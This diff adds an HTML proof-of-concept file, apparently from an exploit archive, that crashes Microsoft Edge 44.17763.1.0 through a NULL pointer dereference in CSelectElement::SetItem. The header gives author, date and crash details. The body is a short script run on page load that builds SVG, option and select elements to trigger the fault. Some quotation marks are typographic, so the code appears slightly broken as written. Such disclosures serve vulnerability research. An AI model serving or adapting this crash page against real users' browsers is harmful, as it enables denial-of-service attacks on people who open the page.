@@ -1,0 +1,51 @@
+<!--
+﻿# Exploit Title: Microsoft Edge 44.17763.1.0 NULL Pointer Dereference. Denial of Service (PoC)
+# Google Dork: N/A
+# Date: 2018-11-14
+# Exploit Author: Bogdan Kurinnoy (b.kurinnoy@gmail.com)
+# Vendor Homepage: https://www.microsoft.com/
+# Version: Microsoft Edge 44.17763.1.0 (Microsoft EdgeHTML 18.17763)
+# Tested on: Windows 10 x64
+# CVE : N/A
+
+# Description:
+
+# Access violation while reading memory at 0x2D0 using a NULL ptr edgehtml!CSelectElement::SetItem+0x190
+
+# https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/19625211/
+
+
+PoC.html
+-->
+
+<html>
+
+<head>
+
+<script>
+
+function f1() {
+	
+	try {var v1 = eventhandler1; } catch(e) { }
+
+	var v2 = document.createElementNS("http://www.w3.org/2000/svg", “pattern”);
+
+	v2.addEventListener("1", v1);
+
+	var v3 = document.createElement(“option”);
+
+	var v4 = document.createElement(“select”);
+
+	v4[4] = v3;
+
+}
+
+</script>
+
+</head>
+
+<body onload=f1()>
+
+</body>
+
+</html>
